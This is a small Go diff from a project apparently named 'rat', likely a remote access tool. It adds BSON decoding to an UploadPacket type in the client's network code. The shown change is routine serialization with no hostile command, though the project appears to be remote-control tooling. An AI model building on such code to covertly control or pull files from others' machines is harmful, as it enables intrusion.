@@ -6,6 +6,8 @@ import (
 	"os"
 
 	"rat/client/network/header"
+
+	"gopkg.in/mgo.v2/bson"
 )
 
 type UploadPacket struct {
@@ -54,4 +56,9 @@ func (packet UploadPacket) OnReceive() error {
 	}()
 
 	return nil
+}
+
+func (packet UploadPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
